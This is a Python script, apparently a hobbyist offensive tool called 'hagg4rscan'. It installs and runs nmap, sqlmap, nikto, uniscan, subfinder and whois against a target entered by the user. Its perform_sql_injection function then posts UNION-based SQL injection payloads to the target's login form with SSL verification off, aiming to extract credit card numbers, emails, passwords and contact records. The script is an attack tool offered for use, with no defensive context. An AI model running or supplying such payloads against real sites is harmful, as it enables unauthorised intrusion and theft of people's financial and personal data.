import subprocess
import os
import requests

def run_command(command):
    """Run a command and return its output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Run a command with sudo and return its output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def save_to_file(filepath, data):
    """Save data to a file."""
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def install_tools():
    """Install necessary tools if not already installed."""
    tools = {
        "uniscan": "sudo apt-get install -y uniscan",
        "nmap": "sudo apt-get install -y nmap",
        "sqlmap": "sudo apt-get install -y sqlmap",
        "nikto": "sudo apt-get install -y nikto",
        "whois": "sudo apt-get install -y whois",
        "subfinder": "sudo apt-get install -y subfinder"
    }
    
    for tool, install_command in tools.items():
        print(f"Checking if {tool} is installed...")
        if not is_tool_installed(tool):
            print(f"{tool} not found. Installing {tool}...")
            stdout, stderr = run_sudo_command(install_command.split())
            if stdout:
                print(stdout)
            if stderr:
                print(stderr)
        else:
            print(f"{tool} is already installed.")

def is_tool_installed(tool_name):
    """Check if a tool is installed."""
    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    """Print the header 'hagg4rscan'."""
    header = """
    \033[91m
    ,:'/¯/`:,       .·/¯/`:,'                ,.-:~:-.                             __'                              __'                          ,.-:~:-.                .:'/*/'`:,·:~·–:.,           
  /:/_/::::/';    /:/_/::::';             /':::::::::'`,                    ,.·:'´::::::::`'·-.                ,.·:'´::::::::`'·-.                 /':::::::::'`,             /::/:/:::/:::;::::::/`':.,'     
 /:'     '`:/::;  /·´    `·,::';          /;:-·~·-:;':::',                 '/::::::::::::::::::';             '/::::::::::::::::::';              /;:-·~·-:;':::',          /·*'`·´¯'`^·-~·:–-'::;:::'`;    
 ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
 |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
 ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
 'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
   ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
     '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
                      '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
    \033[0m
    """
    print(header)

def perform_sql_injection(target_url):
    """Perform SQL Injection using the provided payloads."""
    payloads = [
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
        "' OR 1=1 UNION SELECT email FROM users --",
        "' OR 1=1 UNION SELECT password FROM users --",
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
    ]

    for payload in payloads:
        data = {
            'username': f'admin{payload}',
            'password': 'password'  # Update with the correct password field if needed
        }
        
        try:
            response = requests.post(target_url, data=data, verify=False)  # Disable SSL verification
            print(response.text)  # This will display the extracted data, handle it as you wish
        except requests.RequestException as e:
            print(f"Request failed: {e}")

def main():
    install_tools()
    
    # Clear the screen after installing the tools
    clear_screen()

    # Print the header
    print_header()

    link = input("Target: ")
    link_with_https = f"https://{link}"
    
    # Determine the desktop path
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    target_dir = os.path.join(desktop_path, link)
    os.makedirs(target_dir, exist_ok=True)
    output_file = os.path.join(target_dir, "domain.txt")
    
    # Clear the file if it exists
    open(output_file, 'w').close()
    
    tools = {
        "subfinder": ["sudo", "subfinder", "-d", link, "-o", output_file],
        "sqlmap": ["sqlmap", "--url", link_with_https],
        "whois": ["whois", link],
        "nikto": ["nikto", "-h", link],
        "uniscan": ["uniscan", "-u", link, "-qd"],
        "nmap": ["nmap", link],
    }

    total_tools = len(tools)
    
    for i, (tool_name, command) in enumerate(tools.items(), 1):
        print(f"Running {tool_name} ({i}/{total_tools})...")
        stdout, stderr = run_command(command)
        save_to_file(output_file, f"=== {tool_name} Results ===\n")
        if stdout:
            save_to_file(output_file, stdout)
        if stderr:
            save_to_file(output_file, f"Errors:\n{stderr}")
        
        # Calculate and print the progress
        progress = (i / total_tools) * 100
        print(f"Progress: {progress:.2f}%")

    print("Analysis completed. Results saved in:", output_file)

    # Perform SQL injection
        # Perform SQL injection tests
    print(f"Performing SQL Injection test on {link_with_https}")
    perform_sql_injection(link_with_https)

if __name__ == "__main__":
    main()